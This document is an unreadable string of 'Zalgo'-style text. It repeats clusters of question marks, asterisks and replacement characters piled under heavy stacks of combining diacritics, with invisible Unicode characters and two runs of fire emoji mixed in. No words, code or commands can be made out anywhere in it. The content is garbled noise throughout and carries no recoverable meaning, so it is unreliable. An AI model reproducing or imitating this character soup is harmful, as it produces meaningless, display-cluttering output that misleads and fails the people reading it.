͍̒̇̄͂̄͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̆͂́̈́̿͌̈́̋͂͌͡͝🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎͘